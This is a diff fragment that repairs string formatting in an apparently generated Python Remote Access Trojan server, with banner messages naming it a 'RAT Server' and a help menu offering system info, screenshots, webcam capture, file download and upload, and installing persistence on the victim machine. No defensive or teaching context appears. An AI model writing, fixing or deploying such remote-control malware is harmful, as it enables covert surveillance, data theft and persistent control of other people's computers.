@@ -360,7 +360,7 @@ PORT = {port}
 BUFFER_SIZE = 4096
 
 print(f"[+] RAT Server Started")
-print(f"[+] Listening on {{HOST}}:{{PORT}}")
+print(f"[+] Listening on {HOST}:{PORT}")
 print(f"[+] Use CTRL+C to stop")
 
 class RATServer:
@@ -369,11 +369,11 @@ class RATServer:
         self.running = True
         
     def handle_client(self, client_socket, addr):
-        print(f"[+] Connection from {{addr}}")
+        print(f"[+] Connection from {addr}")
         
         try:
             # Send welcome message
-            client_socket.send(b"RAT_Connected\\n")
+            client_socket.send(b"RAT_Connected\n")
             
             while self.running:
                 # Receive command
@@ -382,12 +382,12 @@ class RATServer:
                 if not cmd:
                     break
                     
-                print(f"[{{addr}}] Command: {{cmd}}")
+                print(f"[{addr}] Command: {cmd}")
                 
                 if cmd.lower() == 'exit':
                     break
                 elif cmd.lower() == 'help':
-                    help_msg = '''Available commands:
+                    help_msg = """Available commands:
 1. sysinfo - System information
 2. screenshot - Take screenshot
 3. webcam - Capture webcam image
@@ -397,8 +397,7 @@ class RATServer:
 7. download <file> - Download file
 8. upload <file> <data> - Upload file
 9. persistence - Install persistence
-10. exit - Close connection
-'''
+10. exit - Close connection"""
                     client_socket.send(help_msg.encode())
                 elif cmd.lower() == 'sysinfo':
                     info = f"""
